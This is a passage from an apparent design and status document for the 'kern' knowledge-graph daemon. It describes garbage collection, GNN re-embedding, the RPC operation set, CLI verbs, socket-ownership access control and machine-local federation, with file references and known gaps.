  (`src/tick_loop/src/tick_tasks.rs:466`), `do_reembed` (`src/tick_loop/src/tick_tasks.rs:498`),
  `do_disk_consolidate` (`src/tick_loop/src/tick_tasks.rs:451`).

**Where.** `src/tick_* (flattened)` (3589 LoC, 8 files) + `src/tick_loop/src/tick.rs` (1070 LoC) — remeasured 2026-07-22, the old 2912/893 had drifted ~660 and ~177 lines behind the tree. `trainer.rs` is the one that is not a queue task: GNN training runs on its own thread.

**Gaps.** `KERN_CAP_DISABLED` (`src/base/src/base_constants.rs:30`) is a **kern-eviction**
sentinel, not an entity cap. Its two readers are `max_loaded_kerns` (how many
kerns stay resident, `enforce_kern_cap`, `src/graph/src/graph.rs:305`) and
`disk_threshold` (the per-kern entity count that triggers a DiskANN spill,
`src/graph/src/graph.rs:374`). `max_kerns` now defaults to **128** (2026-07-22, item
83): a conservative resident bound — eviction is proven safe (`get_mut`
auto-loads; `spawn_unnamed_child_under_cap_keeps_the_child_in_parent_children`),
128 bounds the pathological case, and an explicit `usize::MAX` opts out.
`disk_threshold` still defaults to `KERN_CAP_DISABLED` until item 75 (DiskANN
crash consistency) closes. A per-kern *entity* cap does not exist at all.
Clustering is vector-only; no semantic/structural features. Naming/enrich are
LLM-cold per kern. Only `GnnPropagate` reports a *contained* failure today
(`src/tick_loop/src/tick_gnn_propagate.rs:57`); every other task's early return is still
invisible except as work that did not happen.

---

## 10. Stigmergy GC — `active`

**What.** Cold, stale, non-durable thoughts evict themselves; **Facts and
Documents are immune while Active** (immunity is revoked once superseded);
evictions spill to the cold tier before dropping (spill-before-drop). Spill is
lossless out of RAM, not lossless overall — the cold tier is capped at
`COLD_MAX_ENTRIES = 50_000` and `Store::cold_cap` (`src/store_core/src/lib.rs:739`)
deletes the oldest rows past it, and with no store bound `run_gc` drops the
victim outright.

**How.** `crate::tick_stigmergy::run_gc` (`src/tick/src/tick_stigmergy.rs`) collects victims per
kern where `is_cold_victim` holds (heat below `COLD_HEAT_THRESHOLD=0.01` *and*
not accessed within `COLD_GC_AGE = 7 days` *and* not an Active `Fact`/`Document`),
spills the whole list to the cold store in ONE transaction, then `remove_entity`.
A failed batch retries per victim, so a bad row alone stays hot. Runs on the
maintenance tick gated by `STIGMERGY_GC_INTERVAL = 1 hour` and clock validity.

Past the cold cap the drop is **counted, not silent**: `cold_cap` increments
`Store::cold_evicted` (`src/store_core/src/lib.rs:720`) per deleted row and warns once
per sweep, and `health` reports that total on all three surfaces (the `health`
operation's JSON, `HealthRes`, `kern health` — the daemon's, item 100). The cap
stays intentional.

**Where.** `src/tick/src/tick_stigmergy.rs`, `src/graph/src/reason.rs` (`remove_entity`
cascade-deletes its edges), `src/store_core/src/lib.rs` (cap + eviction counter).

**Gaps.** Victim selection is per-kern linear. No priority/age queue. Cold tier
is brute-force search only, and an entity dropped past the cap is gone — the
counter records that it happened, nothing recovers it.

---

## 11. GNN (learned structure re-embedding) — `active`

**What.** A from-scratch graph neural network that re-embeds each thought from
*graph structure* (not just content), so the dense seed blends content + structure.
Trained per-kern, off the tick loop on a dedicated thread (`src/tick_loop/src/tick_trainer.rs`).

**How.**

- **Graph** (`src/gnn/src/gnn_graph.rs`) — `add_node` (`:39`) / `add_edge` (`:51`) /
  `add_self_loops` (`:111`) / `feature_matrix` (`:83`) / the symmetric normalized
  adjacency, sparse (`:178`, what trains) and dense (`:134`, its reference).
- **Layers** — `LinearLayer` (`src/gnn/src/gnn.rs:85`), `GCNLayer`
  (`src/gnn/src/gnn.rs`: linear + optional `LayerNorm` + `Activation`),
  `LayerNorm` (`src/gnn/src/gnn.rs:73`). No dropout ships.
  `Activation` (`src/gnn/src/gnn.rs`) is exactly two variants — `Relu` and
  `Sigmoid` — each with its derivative. Nothing else is implemented.
- **Model** (`src/gnn/src/gnn.rs:73`) — `Model::new(layers, out_layer)` over a
  `Vec<GCNLayer>` plus an optional `LinearLayer` head; `parameters(_mut)`,
  `param_grads(_mut)`, `zero_grads`. Manual autograd via `backward.rs`
  (`GraphLayer`/`BackwardGraphLayer` traits).
- **Fallible forward/backward.** `Model::forward` (`src/gnn/src/gnn.rs:632`) and
  `Model::backward` (`:30`) return `Result<_, GnnError>` and every layer call
  inside them is a `try_` variant, so a shape or missing-forward-state error
  propagates instead of silently zeroing. `GnnError::MissingForwardState`
  (`src/gnn/src/gnn.rs`) is the specific case a backward-without-forward raises.
- **Training** (`run_learned_propagation`, `src/gnn/src/gnn_propagate.rs:67`) — builds
  a `GnnSnapshot` (features + positive reason edges + last weights), samples
  negative edges, trains a 2-layer GCN (`dim → (dim/2).clamp(16,256) → dim`) for
  `DEFAULT_TRAIN_EPOCHS=24` with `Adam` (`DEFAULT_TRAIN_LEARNING_RATE=0.01`) on
  the link-prediction gradient (`link_prediction_grad`, `src/gnn/src/gnn.rs:516`;
  `link_prediction_loss` at `:13` is the scalar form). Output embeddings blended
  with input features at `DEFAULT_SELF_WEIGHT=0.6`, normalized, written back as
  `gnn_vector`. Requires `≥ DEFAULT_MIN_THOUGHTS=128` thoughts. The whole
  function returns `Result<PropagationResult, String>`: every epoch's forward and
  backward, the inference forward, and the weight marshal are `?`-propagated, so
  **a failed propagation writes nothing** — no half-trained embeddings, no
  weights that produced them.
- **Failure surfacing** (`src/tick_loop/src/tick_gnn_propagate.rs:50-57`) — on `Err` the tick
  logs `kern.gnn` with the kern id and calls `Queue::record_task_failure`, which
  `health` reports as `task_failures` / `last_task_failure`. Embeddings and
  weights are left untouched.
- **Success surfacing** (`src/tick_loop/src/tick_gnn_propagate.rs:40-45`) — on `Ok` the tick
  logs `kern.gnn` at INFO with the kern id and `nodes`, the number of embeddings
  the run produced. It is the only trace a *completed* propagation leaves outside
  the graph: `gnn_vector` is dropped on persist, so nothing on disk can say the
  GNN ever ran. `tests/e2e/test_gnn_recall.py` gates on this line.
- **Optimizers** (`src/gnn/src/gnn.rs`) — `Adam` (`:14`) behind an `Optimizer`
  trait. No SGD ships.
- **Persist** (`src/gnn/src/gnn.rs`) — `marshal_weights` (`:52`) /
  `unmarshal_weights` (`:69`) to and from a byte blob carried on the snapshot,
  versioned `WEIGHT_FILE_VERSION=1` with typed `PersistError` variants for
  version, parameter-count and per-parameter shape mismatch. There is no
  separate weight *file* API — the blob rides the kern.
- **Tensor** (`src/gnn/src/gnn_tensor.rs`) — own 2D tensor + matmul. `SparseMatrix` (`src/gnn/src/gnn_tensor.rs:226`) is the CSR counterpart the GCN aggregation runs on; its columns ascend inside a row, so `matmul` (`:53`) and `transpose` (`:84`) visit the same nonzeros in the same order the dense product does and the swap is bit-identical rather than merely close.

**Where.** `src/gnn_* (and src/gnn.rs shim)` (2766 LoC, 14 files). Driven by
`tick::gnn_propagate::do_gnn_propagate`.

**Gaps.** Training is linear in edges since 2026-07-22 — 73.4s → 11.6s at 4096 measured back to back under load, 6.6s idle (`tests/gnn_scale.rs`); off the tick since 2026-07-21 (`src/tick_loop/src/tick_trainer.rs`). No GPU.
Weights are per-kern, not shared across the tree. Link prediction only — no node-classification objective. **A propagation is reproducible since 2026-07-22** (`ROADMAP.md` item 102): one seed derived from the sorted node ids (`gnn_seed`, `src/tick_loop/src/tick_gnn_propagate.rs:182`) drives both weight init and negative-edge sampling (`src/gnn/src/gnn_propagate.rs:80`), and the two `HashMap` walks that outranked it are sorted — the snapshot's node order (`src/tick_loop/src/tick_gnn_propagate.rs:71`) and the `updates` write-back that fixes HNSW insert order (`src/tick_loop/src/tick_gnn_propagate.rs:212`) — so the same corpus re-embeds identically in every process and `tests/e2e/test_gnn_recall.py` prints the same numbers on every run rather than scoring a draw.
*Corrected 2026-07-21:* a repeatedly failing
propagation does **not** re-enqueue every tick. `GnnPropagate` is enqueued only
when `do_cluster` did structural work (`if did_structural_work`, `src/tick_loop/src/tick.rs:190`),
so a quiescent kern retries nothing; the climbing `task_failures` count
(`src/tick_loop/src/tick_gnn_propagate.rs:57`) is still the only visibility when it does.

---

## 12. Operation surface — `active` (replaced the MCP surface 2026-08-16)

**What.** The daemon's dispatch core. The MCP server (stdio + HTTP/SSE, tools /
resources / prompts, hand-written JSON schemas, `.mcp.json` self-registration)
was deleted 2026-08-16 (user-directed): agents drive the **CLI**, and each CLI
verb is a thin dispatch to the per-root daemon over the typed `KernRpc`
(§13). The surface itself is `rpc::Server::invoke(name, args) -> JSON`
(`src/rpc/src/server.rs`) — one named-operation match, every operation
returning plain JSON with no protocol envelope.

**Operations** (19, all in `src/rpc/src/server.rs` as `tool_*` methods,
dispatched by `Server::invoke`):

| Operation | Purpose |
| ------ | --------- |
| `query` | Hybrid search, LLM-free; the caller synthesizes. Filters: `mode`/`kind`/`source`/`scheme`/time range/`min_conf`/`valid_at`/`as_of`; `include_history` for supersede chain; `exclude_pending` drops rows a `[ingest] review_policy` is still holding (opt-in, with a CLI flag of its own, `kern query --exclude-pending` — which is what makes the review lifecycle e2e-measurable). Returns edges **and path chains**, and `id` resolves a prefix and the cold tier (`retrieval::id_detail::entity_detail_by_id`) — both widenings exist so a CLI `query`/`get` routed through the daemon answers with what the local path answers. An `id` read runs the **same** filters: `build_query_options` runs first and the resolved row goes through `retrieval::score::matches_filter`, so `query {id, kind: "claim"}` on a `Fact` answers `thought not found`. A bare `query {id}` filters nothing — `QueryOptions::default()` leaves `valid_at`/`as_of` unset — which is what keeps an expired row served-and-flagged (`expired`/`valid_until`, stamped in `src/retrieval/src/id_detail.rs`) rather than hidden. |
| `search` | Cross-kern read (§15): hands the query to the machine hub's fan-out and answers `fanout: true` with root-tagged hits plus named `skipped` roots; no reachable hub degrades to this graph only, flagged `fanout: false` with a note. |
| `log` | The git-porcelain read (2026-08-16, `GIT_SURFACE_PLAN.md` phase 1). `log_report` is shared with the CLI's no-daemon fallback so the two cannot disagree. No `id`: the machine history derived from the bitemporal stamps — `added`/`superseded` rows, newest first, capped (`LOG_DEFAULT_LIMIT` 20). With `id`: the revision chain — head, then the `Supersedes` walk (cold tier reached for evicted revisions), each revision with source URI, created/invalidated stamps (UTC minutes, `util::datetime_string`) and the `Supersedes` edge text as the why. Sees only what the stamps record: `forget`/`link`/`degrade` are invisible until the phase-3 operation journal. |
| `events` | Read-only change feed for pollers: `created` for each entity ingested after an opaque cursor and `superseded` for each revision invalidated after it, ordered ascending — derived from the bitemporal stamps the graph already keeps, mutating nothing. `since` = the `cursor` a prior call returned (0/absent = from the beginning) resumes without gap or overlap; `limit` bounds the batch. `degraded`/`forgotten` are declared on the wire contract but never emitted — a forgotten entity leaves no resident row and `degrade` touches edges, not entity timestamps, so neither is derivable read-only. |
| `ingest` | Add text. `object_id` update semantics, free-text `hint` chunking context (`hint` is the only spelling — the `descriptor` alias retired in `7de23c0`), optional `retention_secs` TTL (integer seconds; `0`/absent = never) resolved to an absolute `valid_until` once, before the sync / durable-direct / RAM-queue branch, so all three carry the same deadline. Callers of the operation are agents: confidence clamps against `AGENT_SOURCE` regardless of what the caller asserts. |
| `link` | Create a reason edge (LLM writes the reason if blank). Edge score is the asserted confidence (agent 0.95; CLI-local user 1.0), NOT `cosine(from,to)` — a deliberate link connects what similarity cannot, so similarity must not be its strength. |
| `forget` | Remove a thought + cascade edges (Facts immune). |
| `forget_by_source` | Remove every thought from one `(scheme, object_id)` — **all sections of it**, since `source_id` hashes the section and keying on one would forget a single chunk of a document. Cascades through the same `forget_entity`; refuses local Facts unless `force`, which is the ONLY bypass of the Fact guard and is never implicit. Returns `removed_entities`/`removed_edges`/`kept_facts` — the last so a refused Fact is reported rather than read as "nothing was there". Exists so `kern forget --source` has somewhere to route. |
| `degrade` | Down-weight edges along a bad retrieval path (`DEGRADE_*` decay). Returns `decayed_edges` and `removed_edges` — the reap count exists so a CLI `degrade` routed through the daemon can print what the local path prints. |
| `move` | Relocate a thought to another kern, carrying outgoing edges and restamping cross-kern references. |
| `promote` | Release a thought a review policy is holding: flips `ReviewState::Pending` to `Active`, so a `query {exclude_pending: true}` returns it again. The release half of the lifecycle `[ingest] review_policy` opens; idempotent, returning `promoted: false` on an already-active row rather than failing, and a hard `thought not found` on an id nothing resolves — a silent success would tell a curator a claim was released while it is still held. Shares `graph_ops::promote_entity` with the CLI's no-daemon fallback so the routed and local writes cannot disagree. Any caller who owns the socket may promote — socket ownership is the access model (§13). |
| `health` | Graph stats (gravitons/kerns/entities/reasons/unnamed/claim_kinds) **plus the degradation surface**: `queue_depth`, `tasks_done`, `task_avg_ms`, `task_panics`, `last_task_panic`, `task_failures`, `last_task_failure`, `cold_evicted`, `embed_model`, `embed_dim`, `embed_mismatch`, and the fail-open counters — `query_dim_rejected`, `below_floor_deliveries`, `clock_skew_skips`, `ingest_dropped_chunks`, `unspilled_drops`, `ingest_queue_refused`, `gnn_train_refused` (`remote_cap_dropped` left with federation) — each a path that returns something rather than erroring, so the count is the only way to tell a degraded result from a good one (`Server::health_stats`, `src/rpc/src/server.rs`). Most come off `HealthStats` (`src/health/src/lib.rs`), `gnn_train_refused` straight from the trainer's own global — but all are process-scoped counters read in the *serving* process, which is why only a daemon's answer carries real ones and any other reader reports its own zeros (`ROADMAP.md` item 100). Beside the counters, one gauge: `ingest_queue_depth` reads the serving worker's mpsc channel occupancy live (`Worker::queue_depth`, `src/ingest/src/ingest_worker.rs`) — how full the RAM queue is right now, where `ingest_queue_refused` only says its bound was ever hit (item 30). |
| `graviton` | list/add/remove focus attractors (name + text — phrase or full document — + optional mass). Replaced the single per-kern "purpose". |
| `claim_kind` | register/remove claim kinds; registered kinds extend the built-in distill set. |
| `pulse` | Trigger a clustering pass across the tree. |
| `gc` | Live reap of empty/orphan kerns (`GraphGnn::gc_empty_kerns_counted`); reports `reaped`/`before`/`after` and the live `data.mdb` size, since LMDB keeps freed pages until a restart or an offline `kern gc`, which reaps and then compacts. |
| `audit` | Stored-content hygiene scan (§24): score resident thoughts against the noise/secret patterns, optionally archive or delete. |
| `intake_drain` | One immediate pass of the daemon's own intake drain (`ingest::intake::drain_now`), returning `archived`. Exists so `kern intake drain` has somewhere to route: the CLI's in-process pass reads the same queue directory and archives the same entries as the daemon's poll loop, so both distill the file and both race the archive move. |
| `setup` | Agent-facing installer: returns idempotent wiring instructions (seed gravitons, install the capture rule/hook in the host, verify) plus this project's current [done]/[todo] state. kern never writes host config; the calling agent does the wiring. |

**Server** (`src/rpc/src/server.rs`) — `Server` holds the shared
`graph`/`worker`/`llm`/`task_q`/`cfg`, the two-tier `QueryCache` (§24) and a
`last_activity` stamp (`idle_ms`, health polls excluded — the hub's idle
reaper reads it). It is the one dispatch core: the CLI, the hub's cross-kern
fan-out and any future surface all reach the graph through `invoke`.

**Where.** `src/rpc/src/server.rs`, `src/rpc/src/lib.rs` (RPC handler + serve
loop).

**Gaps.** Operation arguments are serde structs but the surface is stringly
dispatched — an unknown name is a runtime error, not a compile error. No batch
query. The gone MCP resources (`kern://local/*`, `thought://{id}`) have no
replacement read surface beyond `query {id}` / `kern get`.

---

## 13. RPC surface (`kern_rpc`) — `active`

**What.** The `KernRpc` server over a per-root local socket (Unix socket /
Windows named pipe) — since the MCP removal (2026-08-16) it is the daemon's
**only** listener: the CLI's dispatch channel and the hub's control channel.
There is **no tarpc dependency** — the service is generated by this repo's own
`service!` macro (`src/transport/macros/`) over the `typed/` channel + codec.

**How.** The contract is three methods, not a mirror of the operation surface
(`src/transport/src/kern_rpc.rs`): `health() -> HealthRes`,
`shutdown() -> ShutdownRes`, `invoke(InvokeReq) -> InvokeRes` — `InvokeReq` is
`{name, args}` and `InvokeRes` is plain JSON or a string error. Every
operation reaches the daemon through the one `invoke` passthrough, so the CLI
and the daemon cannot drift. `KernRpcHandler` (`src/rpc/src/lib.rs`) wraps the
same `rpc::Server` §12 describes; `health` answers the typed `HealthRes`
(`src/transport/src/kern_rpc.rs:114`), which carries the degradation fields —
`task_panics`/`last_task_panic`, `task_failures`/`last_task_failure`,
`cold_evicted`, `embed_model`/`embed_dim`/`embed_mismatch` — plus `idle_ms`
for the hub's idle reaper and `data_dir`/`kerns`/`entities` for the hub's
stat harvest (§15). Every field is `#[serde(default)]`, so an older daemon
reads as zeros rather than an error. `shutdown` fires the daemon's
save-then-exit path. `serve_kern_rpc_loop` (`src/rpc/src/lib.rs:208`) accepts
on a `LocalListener` and spawns a channel per connection.

**Where.** `src/rpc/src/lib.rs` (handler + serve loop),
`src/transport/src/kern_rpc.rs` (contract, DTOs, client connect).

**Gaps.** There is deliberately **no token handshake** since 2026-08-16 — the
old `AuthReq`/`mcp-token` frame is gone, and socket ownership is the whole
access model: `require_owned_by_caller` (`src/transport/src/typed.rs:561`,
path uid) and `require_peer_is_caller` (`:607`, `SO_PEERCRED` on the live
connection) run on connect *and* in the bind's `AddrInUse` arm, which refuses
a foreign-owned name by uid rather than standing the daemon down. The named
pipe carries an owner-only SDDL that typechecks for Windows and has never run
on one.

---

## 14. CLI — `active`

**What.** The `kern` binary — since the MCP removal (2026-08-16) it is **the
agent surface**: a verb with a routed counterpart is a thin dispatch to the
serving per-root daemon over `KernRpc::invoke` (§13), and only the no-daemon
fallback reads the on-disk graph directly. When a daemon serves: `forget`,
`degrade`, `promote`, `intake drain`, `graviton add`, `graviton remove`,
`claim-kind add` and `claim-kind rm` hand it the write, `get`, `query` and
`log` take their read from it, and `query --all` fans out through the
machine hub (§15).

**Subcommands** (`Commands` enum, `src/commands/src/lib.rs`), declared in the
order the help lists them — put something in, get it back, curate it, shape the
graph, operate the store: `ingest`, `query [--mode M] [--k N] [--all [--live]]
[--exclude-pending]`, `get`, `list`, `log [ID] [--limit N]`, `link`,
`forget [ID | --source <scheme>://<object_id> | --match <pattern>] [--dry-run]
[--force]`, `degrade`, `promote`, `audit`, `intake {status|drain}`,
`graviton {add|list|remove}`, `claim-kind {add|rm}`, `unnamed {list|promote}`,
`status`, `health`, `doctor`, `repair`, `migrate`, `gc`, `reembed`, `export`, `import`,
`register`, `compress`, `profile`, `daemon`, `hub {status|resolve|unload|merge|stop}`.
(`mcp` is gone.) Four git-shaped `visible_alias`es (2026-08-16,
`docs/plans/GIT_SURFACE_PLAN.md` phase 0): `grep` = `query`, `show` = `get`,
`rm` = `forget`, `note` = `link` — both spellings work, no behaviour change.

**Four verbs absorbed their near-duplicates** (2026-08-16, user-directed): a
surface with two spellings for one job costs a reader a decision every time.
`search` → `query --mode vector` (the bare nearest-neighbour read) and
`query --all` (the hub fan-out); `blame <id>` → `log <id>` (they were the same
`log_report` walk); `prune <pattern>` → `forget --match <pattern>`; `compact` →
`gc`, which already reaped *and* compacted, so the separate verb only offered
the half that frees no disk. Alpha policy: no aliases kept for the four.

**Help and failure are part of the surface.** `kern --help` opens with one
line, `kern v<version> - adaptive knowledge graph` (`ABOUT`, built from
`CARGO_PKG_VERSION` so it cannot drift from `--version`), and closes with the
command list — no examples block, and `help_styles()` drops the underline
clap's default styling puts under every section header. Every subcommand,
subaction, positional and flag carries a description — a blank column in `--help` is an
answer the reader has to go read the source for. The three daemon-plumbing
globals (`-d/--daemon`, `--reason-url`, `--reason-model` on `Cli`) are
`hide = true`: they are what the hub, the hot-reload successor and the detached
spawns pass to *themselves*, and `kern daemon` is the documented way in.
Failures go through one channel (`commands_exit.rs`): `fail(command, message)`
prints `kern <command>: <message>` to stderr — never stdout, which is the
answer channel — and sets the flag `main` turns into **exit 1**. Before it,
every `cmd_*` returned `()` and a failed `get`/`repair`/`import` exited 0, so
anything scripting kern had to grep stderr to tell a miss from a hit. Config
errors keep their own **78** (sysexits `EX_CONFIG`).

**How.** `dispatch` (`src/commands/src/lib.rs`) routes; per-subcommand handlers in
`src/commands/src/commands_{admin,doctor,export,graph_ops,ingest_cmd,intake_cmd,query,reembed,route}.rs`.
Notable:

- **Daemon-first writes** (`src/commands/src/commands_route.rs`) — `route(name, args)` probes
  `Endpoint::kern()` once, never spawns, and answers `Done` / `Refused` /
  `NoDaemon`. `forget`, `degrade`, `promote`, `graviton add`/`remove` and
  `claim-kind add`/`rm` take it (the last four via `graviton_at`/`claim_kind_at`,
  `src/commands/src/commands_admin.rs`, which take the endpoint the way `route_to` does so
  the routed path is reachable from a test): while a daemon serves, the
  mutation lands in its live in-memory graph over `invoke` instead of in a
  second copy this process opened, and a daemon that refuses is reported rather
  than retried against the store behind it. No daemon -> the pre-existing local
  path runs, printing through the same printer so the two cannot drift. The
  graviton add routes before it embeds: the daemon embeds with its own client,
  so a local embed first would spend a model call on a vector nobody keeps.

- **Daemon-first reads** (same route, `query` operation) — `get` (`cmd_get`,
  `graph_ops.rs`) and `query` (`cmd_query`, `query.rs`) route before they touch
  disk, so a serving daemon's live graph answers instead of the older snapshot
  this process would load. `get` routes as `query {id}`, `query` as
  `query {text, mode, k}`. `k` is sent explicitly: the tool's own default is
  `seed_k`, well under the delivery pool the local path prints, so omitting it
  would make the hit count depend on whether a daemon happened to be up —
  `retrieval::score::delivery_cap` is the one owner both sides read it from.
  Both paths render through one printer over the operation's own JSON
  (`print_detail`, `print_results`), and one id resolver serves both
  (`retrieval::id_detail::entity_detail_by_id`, prefix-resolving with cold-tier
  fallback), so a routed and a local read cannot disagree about what an id means.
  `query --all` resolves the caller's own root through the hub before fanning
  out (unless `--live`), since the hub only knows roots it has resolved or that
  registered at daemon boot — without it the one project the caller is standing
  in was the one project excluded.
  `query --mode vector` and `list` stay local **by decision** — the vector mode
  is the raw-ANN probe, `list` prints the on-disk kern tree, and both are what a
  developer reaches for to inspect the store itself; `query --all` is the
  exception, fanning out through the hub (`cmd_search_all`,
  `src/commands/src/commands_query.rs`, §15). `--k` binds every mode: the local
  hybrid read trims its render to `k` rather than the pipeline, so a `--k`
  answer is the same size whether or not a daemon was up.

- `log [ID] [--limit N]` (`cmd_log`, `graph_ops.rs`;
  `GIT_SURFACE_PLAN.md` phase 1, 2026-08-16) — the git-porcelain history read,
  routed to the daemon's `log` operation first; the no-daemon fallback calls
  the same `rpc::server::log_report`, so routed and local reads cannot
  disagree. Bare `log` prints the machine history (added/superseded, newest
  first); `log <id>` prints the revision
  chain git-show shaped — id/kind/status, `Date:`/`Gone:` stamps, `Source:`
  URI, and `Why:` from the `Supersedes` edge. Derived entirely from the
  bitemporal stamps: mutations that leave none (`forget`, `link`, `degrade`)
  do not appear until the phase-3 operation journal.

- `forget --source <scheme>://<object_id> [--force]` (`graph_ops.rs`) — the
  host-deletion cascade (ROADMAP item 19). Routes to the `forget_by_source`
  operation first for the same reason plain `forget` does, and both branches print through
  one `print_forget_source`. The segment after `://` is the raw
  `Source::object_id()`, not a parsed URI path — that is the half of the pair the
  graph stores, and re-deriving it from a `ticket://<system>/<id>` spelling would
  guess. `--force` is paired to `--source` **in `dispatch`, not by clap**: a
  single id names one Fact the caller can already see, so the bypass only makes
  sense in bulk — and `#[arg(long, requires = "source")]` does not fire for a
  `SetTrue` flag (clap 4.6), which silently accepted and ignored
  `forget --force <id>`. It reaches `remove_entity`'s own fact guard too, not
  just `forget_entity`'s — lifting only the outer one reports a removal the
  inner one silently refused. `--dry-run` is paired the same way, and for the
  same reason.

- `forget --match <pattern> [--source S] [--dry-run] [--force]` (`cmd_prune`,
  `graph_ops.rs`) — the bulk sweep (RECALL_PLAN F2a, folded into `forget`
  2026-08-16): one store load, a case-insensitive text match over every
  thought, then the same removal path a single-id forget takes. Refuses while
  the writer lock is held, like the offline admin commands. An empty pattern
  matches everything, which is what makes `--source S --dry-run` a preview of a
  whole source. A sweep whose every match was a guarded Fact says so and prints
  `removed nothing` — "forgot 0" is true and reads as a removal that happened.

- `ingest --retention-secs N` (`ingest_cmd.rs`) — expires the ingest after `N`
  seconds by stamping `valid_until`; `0` or the absent flag means never. The
  deadline is resolved **once, before** the guarded write-retry loop, so a
  refused-stale flush that reloads and re-runs cannot push the expiry out by
  however long the retry took. An overflowing `N` is reported and nothing is
  written.

- **The writer lock** (`src/store_core/src/lock.rs`) — one advisory lock per data dir
  (std `File::try_lock`, MSRV 1.89), held for the daemon's whole lifetime and
  taken by every direct-writer admin command. `reembed` and `gc`
  refuse while it is held and name the holder, because "daemon must be stopped"
  was an unenforceable comment (the original offender — a killed hub respawned
  by a surviving `kern mcp` proxy flushing a stale graph over a completed
  re-embed — left with the MCP surface, but the lock is what makes the rule
  enforced rather than remembered). It is an OS file lock, so a killed holder
  releases it — the file's existence is never the lock, and there is no cleanup
  path. The standalone MCP server that also claimed it (`claim_standalone`)
  was deleted with `kern mcp` 2026-08-16: the daemon is the only long-lived
  writer left.
- `register <path>` (`cmd_register`, `commands_admin.rs`) — absorbs another
  store directory into this one. Validates the path **before** opening it (a
  directory, holding a `data.mdb`): `store_core::Store::open` creates the env
  it is pointed at, so a typo used to be silently made into an empty store and
  then reported as registered. Reports the kern and thought counts it took.

- `status` (`cmd_status`, `commands_admin.rs`) — data dir, socket, whether a daemon serves this
  directory, whether the hub runs, and who holds the writer lock. Says so
  explicitly when a daemon serves without holding the lock, since then the
  admin commands will not be refused.

- `reembed` (`reembed.rs`) — re-embeds every entity with a new model in batches,
  re-seeds `gnn_vector` from the raw embed, recomputes reason-edge vectors
  (endpoint means), rebuilds the index, saves, then re-embeds the cold tier. It
  stamps the store with the model it actually embedded with, only after the
  rewrite succeeded; a cold-tier failure is reported explicitly (hot graph on the
  new model, cold tier still on the old). Takes the writer lock and refuses
  rather than racing a live daemon.
- `health` (`admin.rs`) — prints the graph counts, an embed-model mismatch
  warning, `evicted:` and the fail-open `degraded:` line — the daemon's counts
  when one answers, this process's otherwise (item 100) — and, from a daemon,
  `degraded: N panics | M failures | K refused GNN trainings`, faults named
  below, plus `ingest: queue N` — the RAM queue's live depth
  (`ingest_health_lines`, `src/commands/src/commands_admin.rs:227`), daemon-sourced only
  because the CLI's own worker is idle by construction (item 30). From a daemon
  it also prints `convergence: gini 0.NN` — the Gini coefficient over entity
  access counts (`gini_over_access`, `src/health/src/lib.rs`, item 62 half),
  `0.0` = uniform access (converged), → `1.0` asymptotically (finite-n max
  `(n−1)/n`); daemon-sourced only because a CLI's fresh-open graph has no
  query history.
- `profile` (`cmd_profile`, `commands_query.rs`) — runs a query with a `Profiler` timeline.
- `compress` (`admin.rs`) — compresses vectors with a chosen `QuantizationMode`.
- `daemon` / `run_server` (`src/commands/src/lib.rs`) — boots the full runtime: loads
  graph, binds the embedding model and checks the store's stamp, spawns
  watchdog, LLM keepalive, file watcher, the intake, maintenance tick, and the
  `KernRpc` socket — the daemon's only listener — then announces its root to
  the machine hub (`register_with_hub`, §15).
- `--embed-url <url> --embed-model <model>` / `--reason-url --reason-model`
  (`EmbedArgs`/`LlmArgs`, `src/commands/src/lib.rs`) — per-process override of
  the `[embed]`/`[reason]` url/model on the verbs that embed or distill,
  applied to the loaded config before anything embeds. Exists for spawns
  (containers) whose config cannot name the host's Ollama; absent flags leave
  the config exactly as loaded.

**Where.** `src/commands_*`, `src/store_core/src/lock.rs`, `src/main.rs`.

**Gaps.** `ingest` and `link` still open the store directly while a daemon
holds newer state (`intake drain` routes since 2026-07-21). They deliberately reconcile instead of
refusing — the flush guard rejects a stale write and they reload and retry —
because refusing them would make the CLI unusable whenever a daemon runs.
`ingest` and `link` cannot take the daemon route the way `forget`/`degrade` do,
because the RPC's only mutation surface is `invoke`, the agent boundary:
the `ingest` operation clamps to `AGENT_SOURCE` and `link` writes
`MAX_AI_CONFIDENCE`, while the CLI mints at user trust 1.0, so routing them
unchanged would demote every CLI Fact to an agent Claim; kern carries no
caller identity by decision (2026-07-22), so the remaining choice — route and
accept the agent clamp, or stay local behind the flush guard — is owed in
`ROADMAP.md` item 9. `get` and `query` no longer read stale:
both route to a serving daemon over the `query` operation and fall back to the disk
load only when nothing answers. `query --mode vector` and `list` stay local by
decision (`ROADMAP.md` item 9). `kern unnamed promote <id> <name> <seed> [--mass N]`
  promotes an existing unnamed kern to named by giving it a graviton in place
  (no move, no id change — it keeps entities/children/parent and becomes
  `is_named`, so gc keeps it); `accept::promote_unnamed` (`src/graph/src/accept.rs`).

---

## 15. Local federation — the machine hub as knowledge broker — `active`

**What.** Network federation is gone; machine-local federation replaced it.
The `src/gossip` crate (14 source files: multicast LAN discovery, ed25519 peer
identity, contracts/grants, peer ring, seen-set/ledger, CRDT delta wire) was
deleted 2026-08-16 — `FORMAT_VERSION` 10 → 11 (`src/store_core/src/lib.rs:44`:
`Reason.to_net_id` gone so reason ids rehash, `GraphMeta.network_id` renamed
`replica_id`), and `[gossip]` config, `kern peers` and the `sign`/
`contract_grant` delegate tools went with it (CHANGELOG 2026-08-16). What
survived, under honest names: `gossip::identity` was daemon lifecycle, not
peer identity, and lives on as the `identity` crate (§18b); the CRDT
primitives (`GCounter` + `lww_wins`, `src/base/src/crdt.rs`) still serve
local reconcile, `kern hub merge` and `kern import`. In its place the machine
hub (§18a) is now the machine-wide knowledge broker: every kern on this
machine is registered, enumerable and searchable — with no wire between
hosts. Cross-machine/SSH federation is explicitly out of scope.

**How.**

- **Persistent root registry** (`src/hub/src/hub_registry.rs`) —
  `$XDG_STATE_HOME/kern/hub-roots.json` (fallback `~/.local/state/kern/`,
  Windows `LOCALAPPDATA`), atomic temp+rename writes, tolerant open (a torn
  or missing file is an empty registry, never a crash). Every root a hub
  `resolve` touches is recorded (`record_seen`, `src/hub/src/lib.rs`), so the
  registry accretes the machine's kerns as they are used.
- **Reaper-driven upkeep** (`spawn_reaper`, `src/hub/src/lib.rs`, 30s
  cadence) — beside the dead-node reap and idle unload (§18a), each pass
  drops registry roots whose directory vanished (`prune_missing`) and
  harvests per-node stats from live daemons' `health` answers
  (`harvest_stats`: `entities`, `kerns`, and `data.mdb` file length). A cold
  root keeps its last harvest — the registry reports what its daemon last
  said, never a guess.
- **Enumeration** — `kern hub status` lists every known kern, loaded or
  cold, importance-sorted (entities desc, then data bytes):
